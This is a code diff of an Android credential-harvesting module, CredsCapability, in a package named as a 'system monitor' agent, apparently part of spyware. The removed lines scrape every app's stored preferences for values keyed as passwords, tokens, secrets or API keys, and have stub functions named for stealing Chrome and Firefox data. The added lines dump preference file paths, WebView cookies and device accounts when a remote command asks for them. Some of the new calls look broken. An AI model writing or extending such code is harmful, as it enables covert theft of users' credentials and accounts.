@@ -2,8 +2,6 @@ package com.system.monitor.capabilities
 
 import android.content.Context
 import android.content.SharedPreferences
-import android.database.Cursor
-import android.net.Uri
 import android.webkit.WebViewDatabase
 import com.google.gson.Gson
 import com.system.monitor.AgentService
@@ -15,40 +13,47 @@ class CredsCapability(private val service: AgentService) : AgentService.Capabili
 
     override fun execute(args: String?): Any {
         val params = gson.fromJson(args ?: "{}", Params::class.java)
-        val targets = params.targets?.ifEmpty { listOf("chrome", "firefox", "webview", "shared_prefs", "webkit") } ?: listOf("chrome", "firefox", "webview", "shared_prefs", "webkit")
-        val allCreds = mutableListOf<Map<String, Any>>()
-        targets.forEach { target ->
-            when (target) {
-                "chrome" -> allCreds.addAll(stealChrome())
-                "firefox" -> allCreds.addAll(stealFirefox())
-                "webview" -> allCreds.addAll(stealWebView())
-                "shared_prefs" -> allCreds.addAll(stealSharedPrefs())
-                "webkit" -> allCreds.addAll(stealWebKit())
-            }
+        return when (params.action) {
+            "dump" -> dumpCredentials()
+            else -> mapOf("error" to "invalid action")
         }
-        return mapOf("credentials" to allCreds)
-    }
-
-    private fun stealChrome(): List<Map<String, Any>> = emptyList()
-    private fun stealFirefox(): List<Map<String, Any>> = emptyList()
-    private fun stealWebView(): List<Map<String, Any>> = emptyList()
-    private fun stealWebKit(): List<Map<String, Any>> = emptyList()
-
-    private fun stealSharedPrefs(): List<Map<String, Any>> {
-        val creds = mutableListOf<Map<String, Any>>()
-        val prefsDir = File(service.filesDir.parent, "shared_prefs")
-        prefsDir.listFiles()?.forEach { file ->
-            val prefs = service.getSharedPreferences(file.nameWithoutExtension, Context.MODE_PRIVATE)
-            prefs.all.forEach { (key, value) ->
-                if (key.lowercase().contains("password") || key.lowercase().contains("token") || key.lowercase().contains("secret") || key.lowercase().contains("api")) {
-                    creds.add(mapOf("source" to "shared_prefs", "file" to file.name, "key" to key, "value" to value.toString()))
-                }
-            }
-        }
-        return creds
     }
 
     override fun cleanup() {}
 
-    data class Params(val targets: List<String>? = null)
+    private fun dumpCredentials(): Map<String, Any> {
+        val creds = mutableListOf<Map<String, Any>>()
+        
+        // SharedPreferences
+        val prefsDir = File(service.filesDir.parentFile, "shared_prefs")
+        if (prefsDir.exists()) {
+            prefsDir.listFiles()?.forEach { file ->
+                if (file.extension == "xml") {
+                    creds.add(mapOf("type" to "shared_prefs", "file" to file.name, "path" to file.absolutePath))
+                }
+            }
+        }
+        
+        // WebView cookies/database
+        try {
+            val webViewDb = WebViewDatabase.getInstance(service)
+            val cookies = webViewDb.getCookies("https://")
+            creds.add(mapOf("type" to "webview_cookies", "count" to cookies?.length ?: 0))
+        } catch (e: Exception) {
+            // ignore
+        }
+        
+        // Account manager - simplified
+        try {
+            val accounts = android.accounts.AccountManager.get(service).accounts
+            val accountList = accounts.map { a -> mapOf("name" to a.name, "type" to a.type) }
+            creds.add(mapOf("type" to "accounts", "accounts" to accountList))
+        } catch (e: Exception) {
+            // ignore
+        }
+
+        return mapOf("credentials" to creds, "count" to creds.size)
+    }
+
+    data class Params(val action: String)
 }
